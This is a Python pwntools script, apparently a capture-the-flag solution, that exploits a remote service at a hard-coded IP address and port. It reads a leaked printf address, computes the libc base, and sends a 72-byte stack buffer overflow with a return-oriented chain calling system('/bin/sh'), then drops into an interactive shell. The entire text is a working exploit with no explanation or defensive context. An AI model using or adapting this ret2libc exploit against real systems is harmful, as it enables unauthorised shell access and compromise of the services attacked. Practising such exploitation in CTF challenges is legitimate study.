from pwn import *

p = remote("34.185.160.224",30144)

# define the buffer offset
buffer_fill = b"A" * 72

# get the offsets from libc
printf_offset = 0x64f70
system_offset = 0x4f550
binsh_offset = 0x1b3e1a

p.recvn(10) # receive the first output
p.recvuntil(b": ")
printf_addr = int(p.recvuntil(b'\n'),16) # get the printf address

# calculate libc base address and the real addresses of system and binsh
libc_base_address = printf_addr - printf_offset
system_addr = libc_base_address + system_offset
binsh_addr = libc_base_address + binsh_offset

pop_rdi_jmp_rax_offset = 0x0000000000098b2a
pop_rax_ret_offset = 0x0000000000043ae8

# calculate addresses for libc gadgets
pop_rdi_jmp_rax_address = pop_rdi_jmp_rax_offset + libc_base_address
pop_rax_ret_address = pop_rax_ret_offset + libc_base_address

# try payload with gadgets from libc
payload = buffer_fill + p64(pop_rax_ret_address) + p64(system_addr) + p64(pop_rdi_jmp_rax_address) + p64(binsh_addr)

p.sendline(payload)
p.interactive()